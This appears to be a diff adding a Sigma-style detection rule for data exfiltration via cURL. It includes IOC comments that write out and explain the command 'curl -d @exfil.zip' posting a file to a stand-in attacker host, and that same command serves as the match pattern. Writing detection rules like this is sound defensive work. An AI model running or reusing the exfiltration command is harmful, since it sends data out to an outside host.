@@ -1,0 +1,39 @@
+#cURL Exfiltration - Intel Analysis
+#IOC1 - Image: curl.exe
+#IOC2 - CommandLine: curl -d @exfil.zip http://huntmeplz.com:8080/
+#The cURL command curl -d @exfil.zip http://huntmeplz.com:8080/ is used to upload the file exfil.zip to the URL http://huntmeplz.com:8080/. The -d flag tells cURL to use the data from the file exfil.zip as the request body. The @ symbol tells cURL to read the data from the file exfil.zip instead of from standard input. The http://huntmeplz.com:8080/ URL is the target of the request.
+
+#Rule Identification
+title: Client URL (cURL) Data Exfiltration
+status: experimental
+author: Mirza Mansoor Ali Baig
+date: 30/01/2024
+description: Detects the data exfiltration via cURL command line.
+#log source
+logsource:
+      category: webserver
+#Detection Description
+detection:
+       selection:
+             Image|endswith:
+             - '\curl.exe'
+             Commandline|contains|all:
+             - 'curl -d @exfil.zip'
+             - 'http://huntmeplz.com:8080'   
+       condition: selection
+fields:
+   - EventID
+   - Image
+   - CommandLine
+#Rule Metadata
+falsepositives:
+   - Legit admin running cURL tool for testing purposes
+level:
+   - Medium
+references:
+   - https://blog.apnic.net/2022/03/31/how-to-detect-and-prevent-common-data-exfiltration-attacks/#:~:text=One%20such%20tool%20is%20cURL,POST%20file%20to%20attacker%20server.
+tags:
+   - attack.exfiltration
+   - attack.T1011.001
+
+      
